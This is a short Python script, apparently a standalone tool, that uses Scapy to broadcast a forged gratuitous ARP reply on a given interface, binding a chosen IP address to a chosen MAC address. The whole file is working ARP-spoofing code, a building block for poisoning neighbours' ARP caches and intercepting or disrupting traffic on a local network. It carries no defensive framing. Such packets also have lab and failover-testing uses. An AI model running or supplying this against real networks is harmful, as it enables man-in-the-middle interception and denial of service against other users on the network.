#!/usr/bin/env python3

#from scapy.all import *
import sys
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sendp

def send_spoofed_arp(iface, src_ip, src_mac):
    try:
        #arp_packet = ARP(op=1, pdst=src_ip, psrc=src_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=src_mac)
        #sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac)/arp_packet, iface=iface, verbose=False)  # sendp for specifying interface
        arp_packet = ARP(op=2, pdst=src_ip, psrc=src_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=src_mac)
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac)/arp_packet, iface=iface, verbose=False)  # sendp for specifying interface

        print(f"Sent spoofed gratuitous ARP request to from {src_ip} ({src_mac}) via interface {iface}")

    except Exception as e:
        print(f"Error sending gratuitous ARP packet: {e}")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: send_spoof_arp.py <interface> <source_ip> <source_mac>")
        sys.exit(1)
    # Get parameters from the command line (optional, for more robust usage)
    #  You could use argparse for better command-line argument handling.
    iface = sys.argv[1]
    src_ip = sys.argv[2]
    src_mac = sys.argv[3]
    send_spoofed_arp(iface, src_ip, src_mac)
